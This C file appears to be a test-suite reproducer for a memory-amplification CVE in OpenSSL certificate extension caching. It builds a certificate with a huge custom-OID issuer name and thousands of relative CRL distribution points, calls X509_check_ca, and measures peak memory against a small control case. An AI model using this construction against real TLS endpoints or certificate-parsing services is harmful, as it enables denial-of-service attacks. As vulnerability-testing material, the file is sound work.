/* SPDX-License-Identifier: Apache-2.0 */
/*
 * CVE-2026-35189 - memory amplification in x509v3_cache_extensions().
 * setup_dp() -> DIST_POINT_set_dpname() duplicated the certificate issuer
 * name (X509_NAME_dup) once per nameRelativeToCRLIssuer distribution point,
 * eagerly, while caching extensions on every parsed certificate. A small
 * chain with many relative CRL distribution points and a large issuer name
 * turns into hundreds of megabytes of heap on a plain TLS handshake, before
 * verification. Fix: c72ae182ca (crypto/x509v3/{v3_crld.c,v3_purp.c}) builds
 * that name on demand in the CRL matching code instead. Reachable pre-verify
 * via javacrypto X509_check_ca (NC:5085) and wpa_supplicant/racoon chain
 * checks. This is a peak-RSS class: ASan does not see it.
 *
 * attack : an issuer name of KKTLS_ISSUER_RDNS big RDNs + KKTLS_DP_COUNT relative
 *          distribution points; X509_check_ca() caches the extensions and the
 *          per-DP issuer-name copies pin the heap. MAXRSS_KB >> baseline.
 * control: a small issuer name and one distribution point; low RSS.
 */
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <stdlib.h>
#include <string.h>
#include "../cve_common.h"

int main(int argc, char **argv)
{
    int ctl = cve_is_control(argc, argv);
    /* issuer value length: a custom OID RDN has no string-table length cap
     * (commonName would be rejected past 64 bytes), so one big RDN gives a
     * large issuer name cheaply. */
    long ibytes = ctl ? 64 : (getenv("KKTLS_ISSUER_BYTES")
                              ? atol(getenv("KKTLS_ISSUER_BYTES")) : 60000);
    long dps = ctl ? 1 : (getenv("KKTLS_DP_COUNT")
                          ? atol(getenv("KKTLS_DP_COUNT")) : 3000);
    long i;
    int ca;
    X509 *x = X509_new();
    X509_NAME *iname = X509_NAME_new();
    CRL_DIST_POINTS *cdp = sk_DIST_POINT_new_null();
    char *val = malloc(ibytes + 1);

    memset(val, 'A', ibytes);
    val[ibytes] = '\0';
    X509_NAME_add_entry_by_txt(iname, "1.2.3.4.5.6.7", MBSTRING_ASC,
                               (unsigned char *)val, -1, -1, 0);
    X509_set_issuer_name(x, iname);
    X509_set_subject_name(x, iname);

    /* crlDistributionPoints with many nameRelativeToCRLIssuer entries */
    for (i = 0; i < dps; i++) {
        DIST_POINT *dp = DIST_POINT_new();
        X509_NAME_ENTRY *ne;
        dp->distpoint = DIST_POINT_NAME_new();
        dp->distpoint->type = 1;  /* relativename */
        dp->distpoint->name.relativename = sk_X509_NAME_ENTRY_new_null();
        ne = X509_NAME_ENTRY_create_by_txt(NULL, "CN", MBSTRING_ASC,
                                           (unsigned char *)"r", -1);
        sk_X509_NAME_ENTRY_push(dp->distpoint->name.relativename, ne);
        sk_DIST_POINT_push(cdp, dp);
    }
    /* install the extension (re-parsed by x509v3_cache_extensions) */
    X509_add1_ext_i2d(x, NID_crl_distribution_points, cdp, 0, 0);

    /* triggers x509v3_cache_extensions -> setup_crldp -> per-DP name dup */
    cve_call("X509_check_ca");
    ca = X509_check_ca(x);
    cve_reached("X509_check_ca");
    printf("X509_check_ca -> %d (issuer_bytes=%ld dps=%ld)\n", ca, ibytes, dps);

    cve_report_rss();

    sk_DIST_POINT_pop_free(cdp, DIST_POINT_free);
    X509_NAME_free(iname);
    X509_free(x);
    free(val);
    return 0;
}
